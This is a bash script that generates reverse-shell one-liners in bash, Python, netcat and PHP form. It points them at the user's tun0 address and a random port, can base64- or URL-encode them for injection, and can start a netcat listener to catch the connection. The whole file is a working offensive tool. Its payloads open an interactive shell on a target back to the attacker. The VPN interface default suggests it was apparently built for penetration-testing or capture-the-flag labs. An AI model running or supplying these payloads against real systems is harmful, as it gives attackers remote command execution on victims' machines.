#!/bin/bash
#set -x
#
#

TYPE="bash"
IP="$(ifconfig tun0 2>/dev/null | grep netmask | awk '{print $2}')"
PORT="$(shuf -i 10000-65000 -n 1)"
INTERFACE=False
RUN=False
ENCODE=False
ENCODERS=(
	base64
	url
	)



Usage(){
	while read -r line; do
		printf "%b\n" "$line"
	done <<-EOF
	\r#OPTIONS:
	\r        -t, --type           - Payload Type [python, netcat, bash, php].
	\r        -i, --ip             - Local IP.
	\r        -p, --port           - Local Port.
	\r        -r, --run            - Run Netcat Listener.
	\r        -e, --encode         - Encode The Payload [base64, url].
	\r        -I, --interface      - Get The IP From Specific Interface (Default: tun0).
	\r        -h, --help           - Prints The Help and Exit.
	\r
	EOF
	exit
}


while [ -n "$1" ]; do
	case $1 in
		-t|--type)
			TYPE="$2"
			shift ;;
		-i|--ip)
			IP="$2"
			shift ;;
		-p|--port)
			PORT="$2"
			shift ;;
		-r|--run)
			RUN=True ;;
		-e|--encode)
			ENCODE="$2"
			if [[ ! " ${ENCODERS[@]} " =~ " ${ENCODE} " ]]; then
				printf "[!] Unknown Encoder: $ENCODE\n"
				Usage
			fi
			shift ;;
		-I|--interface)
			INTERFACE="$2"
			shift ;;
		-h|--help)
			Usage ;;
		*)
			echo "[-] Unknown Option: $1"
			Usage ;;
	esac
	shift
done


Payload(){
	[ "$INTERFACE" != False ] && IP="$(ifconfig $INTERFACE 2>/dev/null | grep netmask | awk '{print $2}')"
	[ "$TYPE" == "bash" ] && PAYLOAD="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
	[ "$TYPE" == "python" ] && PAYLOAD="python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
	[ "$TYPE" == "netcat" ] && PAYLOAD="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
	[ "$TYPE" == "php" ] && PAYLOAD="php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

	[[ "$ENCODE" == False ]] && echo "$PAYLOAD" || {
		[ "$ENCODE" == "base64" ] && echo "$PAYLOAD" | base64 -w 0
		[ "$ENCODE" == "url" ] && python3 -c "import urllib.parse as enc; print(enc.quote_plus('$PAYLOAD'))"
	}
}


Payload; echo


[ "$RUN" != False ] && printf "\n[+] Staring Netcat Listener:\n" && nc -nvlp $PORT

